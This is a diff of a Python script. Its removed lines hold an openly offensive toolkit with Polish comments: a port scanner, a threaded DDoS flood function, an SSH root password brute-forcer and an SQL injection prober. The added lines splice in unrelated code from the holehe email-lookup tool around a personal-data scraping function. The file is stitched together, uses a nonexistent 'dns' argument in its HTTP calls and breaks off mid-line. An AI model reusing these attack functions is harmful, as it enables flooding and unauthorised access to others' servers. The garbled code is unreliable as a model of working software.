@@ -1,127 +1,35 @@
-import socket
-import requests
-import threading
-import paramiko
-import re
-import argparse
-import logging
-import random
-import os
 from bs4 import BeautifulSoup
+from termcolor import colored
+import httpx
+import trio
+
+from subprocess import Popen, PIPE
+import os
+from argparse import ArgumentParser
+import csv
+from datetime import datetime
+import time
+import importlib
+import pkgutil
+import hashlib
+import re
 import sys
+import string
+import random
+import json
 
-# Stałe
-TIMEOUT = 0.5
+from holehe.localuseragent import ua
+from holehe.instruments import TrioProgress
 
-# Lista serwerów DNS (możesz dowolnie zmieniać lub dodawać inne)
-DNS_SERVERS = ['1.1.1.1', '1.0.0.1', '8.8.8.8', '8.8.4.4']
+try:
+    import cookielib
+except Exception:
+    import http.cookiejar as cookielib
 
-# Inicjalizacja loggera
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+DEBUG        = False
+EMAIL_FORMAT = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
 
-def scan_ports(target, start_port, end_port):
-    """
-    Funkcja skanująca porty na podanym adresie IP w danym zakresie.
-    """
-    open_ports = []
-    for port in range(start_port, end_port + 1):
-        try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.settimeout(TIMEOUT)
-                s.connect((target, port))
-                open_ports.append(port)
-                logging.info(f"Found open port: {port}")
-        except:
-            pass
-    return open_ports
-
-def ddos_attack(target, num_requests=None):
-    """
-    Funkcja przeprowadzająca atak DDoS na podany cel.
-    """
-    num_requests = num_requests or random.randint(100, 1000)
-
-    def send_request():
-        try:
-            # Wybierz losowy serwer DNS
-            dns_server = random.choice(DNS_SERVERS)
-            # Ustaw adres IP serwera DNS jako parametr dns
-            response = requests.get(target, dns=(dns_server, dns_server))
-            logging.info(f"Sent request to target using DNS server: {dns_server}")
-        except Exception as e:
-            logging.error(f"Failed to send request to target: {e}")
-
-    threads = []
-    for i in range(num_requests):
-        t = threading.Thread(target=send_request)
-        threads.append(t)
-        t.start()
-
-    for t in threads:
-        t.join()
-
-def brute_force(target, passwords_file):
-    """
-    Funkcja przeprowadzająca atak brute force na SSH z wykorzystaniem podanej listy haseł.
-    """
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    passwords_file = os.path.join("data", passwords_file)
-    if os.path.exists(passwords_file):
-        try:
-            with open(passwords_file, "r") as f:
-                passwords = f.readlines()
-                if passwords:
-                    password = random.choice(passwords).strip()
-                    try:
-                        ssh.connect(target, username="root", password=password)
-                        logging.info(f"Brute force successful. Found password: {password}")
-                        return password
-                    except Exception as e:
-                        logging.error(f"Brute force unsuccessful: {e}")
-                else:
-                    logging.warning("Empty passwords file.")
-        except Exception as e:
-            logging.error(f"Error reading passwords file: {e}")
-            sys.exit(1)
-    else:
-        logging.error("Passwords file not found.")
-        sys.exit(1)
-
-    logging.warning("Brute force unsuccessful. Password not found.")
-    return None
-
-def sql_injection(target_url, sql_file):
-    """
-    Funkcja przeprowadzająca test SQL injection na podanej stronie internetowej.
-    """
-    sql_file = os.path.join("data", sql_file)
-    if os.path.exists(sql_file):
-        try:
-            with open(sql_file, "r") as f:
-                sql_queries = f.readlines()
-                if sql_queries:
-                    for query in sql_queries:
-                        query = query.strip()
-                        url = f"{target_url}?id={query}"
-                        try:
-                            response = requests.get(url)
-                            if "error" in response.text.lower() or "database" in response.text.lower():
-                                logging.info(f"SQL injection vulnerability found. Query: {repr(query)}, Response: {repr(response.text)}")
-                                return query, response.text
-                        except Exception as e:
-                            logging.error(f"SQL injection test failed: {e}")
-                else:
-                    logging.warning("Empty SQL file.")
-        except Exception as e:
-            logging.error(f"Error reading SQL file: {e}")
-            sys.exit(1)
-    else:
-        logging.error("SQL file not found.")
-        sys.exit(1)
-
-    logging.warning("SQL injection vulnerability not found.")
-    return None
+__version__ = "1.61"
 
 def personal_data_scan(target_url):
     """
@@ -136,10 +44,13 @@ def personal_data_scan(target_url):
     }
 
     try:
-        # Wybierz losowy serwer DNS
-        dns_server = random.choice(DNS_SERVERS)
+        # Użyj innego serwera DNS do wykonywania żądań
+        dns_servers = ['1.1.1.1', '1.0.0.1']  # Inne serwery DNS
+        dns_server = random.choice(dns_servers)
+        
         # Ustaw adres IP serwera DNS jako parametr dns
-        response = requests.get(target_url, dns=(dns_server, dns_server))
+        response = httpx.get(target_url, dns=(dns_server, dns_server))
+        
         soup = BeautifulSoup(response.text, 'html.parser')
         found_data = {}
 
@@ -149,13 +60,67 @@ def personal_data_scan(target_url):
                 found_data[key] = [match.strip() for match in matches]
 
         if found_data:
-            logging.info("Personal data found on the target website:")
+            print("Personal data found on the target website:")
             for category, data in found_data.items():
-                logging.info(f"{category}: {data}")
+                print(f"{category}: {data}")
         else:
-            logging.info("No personal data found on the target website.")
+            print("No personal data found on the target website.")
 
     except Exception as e:
-        logging.error(f"An error occurred during personal data scan: {e}")
+        print(f"An error occurred during personal data scan: {e}")
 
+def import_submodules(package, recursive=True):
+    """Get all the holehe submodules"""
+    if isinstance(package, str):
+        package = importlib.import_module(package)
+    results = {}
+    for loader, name, is_pkg in pkgutil.walk_packages(package.__path__):
+        full_name = package.__name__ + '.' + name
+        results[full_name] = importlib.import_module(full_name)
+        if recursive and is_pkg:
+            results.update(import_submodules(full_name))
+    return results
 
+def get_functions(modules,args=None):
+    """Transform the modules objects to functions"""
+    websites = []
+
+    for module in modules:
+        if len(module.split(".")) > 3 :
+            modu = modules[module]
+            site = module.split(".")[-1]
+            if args is not None and args.nopasswordrecovery==True:
+                if  "adobe" not in str(modu.__dict__[site]) and "mail_ru" not in str(modu.__dict__[site]) and "odnoklassniki" not in str(modu.__dict__[site]) and "samsung" not in str(modu.__dict__[site]):
+                    websites.append(modu.__dict__[site])
+            else:
+                websites.append(modu.__dict__[site])
+    return websites
+
+def check_update():
+    """Check and update holehe if not the last version"""
+    check_version = httpx.get("https://pypi.org/pypi/holehe/json")
+    if check_version.json()["info"]["version"] != __version__:
+        if os.name != 'nt':
+            p = Popen(["pip3",
+                       "install",
+                       "--upgrade",
+                       "holehe"],
+                      stdout=PIPE,
+                      stderr=PIPE)
+        else:
+            p = Popen(["pip",
+                       "install",
+                       "--upgrade",
+                       "holehe"],
+                      stdout=PIPE,
+                      stderr=PIPE)
+        (output, err) = p.communicate()
+        p_status = p.wait()
+        print("Holehe has just been updated, you can restart it.")
+        exit()
+
+def credit():
+    """Print Credit"""
+    print('Twitter : @palenath')
+    print('Github : https://github.com/megadose/holehe')
+    print('For BTC Donations : 1FHDM
